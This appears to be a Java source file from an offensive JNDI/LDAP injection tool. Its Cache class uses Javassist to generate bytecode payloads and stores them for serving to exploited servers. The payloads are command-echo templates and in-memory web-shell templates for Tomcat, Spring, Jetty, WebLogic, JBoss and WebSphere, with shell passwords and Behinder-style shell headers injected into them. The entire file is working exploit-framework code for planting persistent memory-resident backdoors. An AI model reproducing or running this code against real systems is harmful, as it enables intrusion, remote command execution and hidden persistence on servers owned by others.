package com.feihong.ldap.utils;

import com.feihong.ldap.template.*;
import javassist.*;
import net.jodah.expiringmap.ExpirationPolicy;
import net.jodah.expiringmap.ExpiringMap;
import weblogic.ldap.EmbeddedLDAPSearchResult;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.concurrent.TimeUnit;

public class Cache {

    public static String basicCmdShellPwd = Config.basicCmdShellPwd;
    public static String behinderShellHeader = Config.behinderShellHeader;
    public static String behinderShellPwd = Config.behinderShellPwd;
    public static String classSuffix = Config.classSuffix;


    private static ExpiringMap<String, byte[]> map = ExpiringMap.builder().maxSize(1000).expiration(30, TimeUnit.SECONDS).variableExpiration().expirationPolicy(ExpirationPolicy.CREATED).build();

    static {
        try {
            String DynamicFilterTemplateBytes = getDynamicTemplateB64Code(DynamicFilterTemplate.class);
            String DynamicInterceptorTemplateBytes = getDynamicTemplateB64Code(DynamicInterceptorTemplate.class);

            //过期时间100年，永不过期的简单方法
            map.put("TomcatEchoTemplate", getEchoTemplateBytes(TomcatEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("SpringEchoTemplate", getEchoTemplateBytes(SpringEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicEchoTemplate", getEchoTemplateBytes(WeblogicEchoTemplate.class), 365 * 100, TimeUnit.DAYS);
            map.put("TomcatMemshellTemplate1", getMemshellTemplate(TomcatMemshellTemplate1.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("TomcatMemshellTemplate2", getMemshellTemplate(TomcatMemshellTemplate2.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("JettyMemshellTemplate", getMemshellTemplate(JettyMemshellTemplate.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicMemshellTemplate1", getMemshellTemplate(WeblogicMemshellTemplate1.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("WeblogicMemshellTemplate2", getMemshellTemplate(WeblogicMemshellTemplate2.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            //map.put("BehinderFilter", getMemshellTemplate(BehinderFilter.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("JBossMemshellTemplate", getMemshellTemplate(JBossMemshellTemplate.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("WebsphereMemshellTemplate", getMemshellTemplate(WebsphereMemshellTemplate.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            map.put("SpringMemshellTemplate", getMemshellTemplate(SpringMemshellTemplate.class, DynamicFilterTemplateBytes), 365 * 100, TimeUnit.DAYS);
            //map.put("isOK", Util.getClassBytes(isOK.class), 365 * 100, TimeUnit.DAYS);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] get(String key) {
        return map.get(key);
    }

    public static void set(String key, byte[] bytes) {
        map.put(key, bytes);
    }

    public static boolean contains(String key) {
        return map.containsKey(key);
    }

    public static void remove(String key) {
        map.remove(key);
    }


    public static String getDynamicTemplateB64Code(Class clazz) throws Exception {
        String className = clazz.getName();

        String newClassName = className + classSuffix;
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(className);
        if (!ctClass.isFrozen()) {
            CtConstructor ctConstructor = ctClass.getConstructors()[0];
            String initStringCode = String.format("this.basicCmdShellPwd = \"%s\";", basicCmdShellPwd);
            ctConstructor.insertBeforeBody(initStringCode);
            initStringCode = String.format("this.behinderShellHeader = \"%s\";", behinderShellHeader);
            ctConstructor.insertBeforeBody(initStringCode);
            initStringCode = String.format("this.behinderShellPwd = \"%s\";", behinderShellPwd);
            ctConstructor.insertBeforeBody(initStringCode);

            ctClass.replaceClassName(className, newClassName);
        }
        return base64Encode(ctClass.toBytecode());
    }

    public static byte[] getEchoTemplateBytes(Class clazz) throws CannotCompileException, NotFoundException, IOException, ClassNotFoundException {
        String className = clazz.getName();
        String newClassName = className + classSuffix;

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(className);
        if (!ctClass.isFrozen()) {
            // weblogic的有点特殊，没有办法直接修改，需要通过函数修改
            if (className.indexOf("Weblogic")>0) {
                CtMethod ctMethod = ctClass.getDeclaredMethod("setBasicCmdShellPwd");
                String initStringCode = String.format("{this.basicCmdShellPwd = \"%s\";}", basicCmdShellPwd);
                ctMethod.setBody(initStringCode);
            }else{
                CtConstructor ctConstructor = ctClass.getConstructors()[0];
                String initStringCode = String.format("this.basicCmdShellPwd = \"%s\";", basicCmdShellPwd);
                ctConstructor.insertBeforeBody(initStringCode);
            }
            ctClass.replaceClassName(className, newClassName);
        }
        return ctClass.toBytecode();
    }

    public static byte[] getMemshellTemplate(Class clazz, String DynamicFilterTemplateB64Code) throws NotFoundException, CannotCompileException, IOException {
        String className = clazz.getName();
        String newClassName = className + classSuffix;
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(className);
        if (!ctClass.isFrozen()) {
            if (className.indexOf("Weblogic")>0) {
                CtMethod ctMethod = ctClass.getDeclaredMethod("setDynamicFilterTemplateB64Code");
                String initStringCode = String.format("{this.DynamicFilterTemplateB64Code = \"%s\";}", DynamicFilterTemplateB64Code);
                ctMethod.setBody(initStringCode);
            }else {
                CtConstructor ctConstructor = ctClass.getConstructors()[0];
                String initStringCode = String.format("this.DynamicFilterTemplateB64Code = \"%s\";", DynamicFilterTemplateB64Code);
                ctConstructor.insertBeforeBody(initStringCode);
            }
            ctClass.replaceClassName(className, newClassName);
        }
        return ctClass.toBytecode();
    }

    public static String base64Encode(byte[] bytes) throws Exception {
        String result;

        try {
            Class clazz = Class.forName("java.util.Base64");
            Method method = clazz.getDeclaredMethod("getEncoder");
            Object obj = method.invoke(null);
            method = obj.getClass().getDeclaredMethod("encodeToString", byte[].class);
            obj = method.invoke(obj, bytes);
            result = (String) obj;
        } catch (ClassNotFoundException e) {
            Class clazz = Class.forName("sun.misc.BASE64Encoder");
            Method method = clazz.getMethod("encodeBuffer", byte[].class);
            Object obj = method.invoke(clazz.newInstance(), bytes);
            result = (String) obj;
            result = result.replaceAll("\r|\n|\r\n", "");
        }

        return result;
    }
}
